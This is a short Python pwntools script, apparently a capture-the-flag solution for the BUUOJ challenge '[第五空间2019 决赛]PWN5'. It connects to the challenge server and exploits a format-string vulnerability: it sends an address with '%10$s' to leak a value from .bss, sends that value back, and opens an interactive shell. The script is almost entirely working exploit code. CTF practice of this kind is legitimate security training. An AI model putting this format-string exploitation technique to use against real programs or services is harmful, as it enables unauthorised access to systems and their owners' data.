from pwn import *


def pwn5(file_name=r'/mnt/hgfs/CyberSecurity/PWN/buuoj/[第五空间2019 决赛]PWN5'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28490)

    bss_addr = p32(0x804C044) + b'%10$s'

    payload = bss_addr

    target.sendline(payload)

    print(target.recvuntil(b'\x44\xc0\x04\x08'))
    bss_num = u32(target.recv(4))
    print(hex(bss_num))
    target.sendline(str(bss_num))
    target.interactive()


if __name__ == '__main__':
    pwn5()
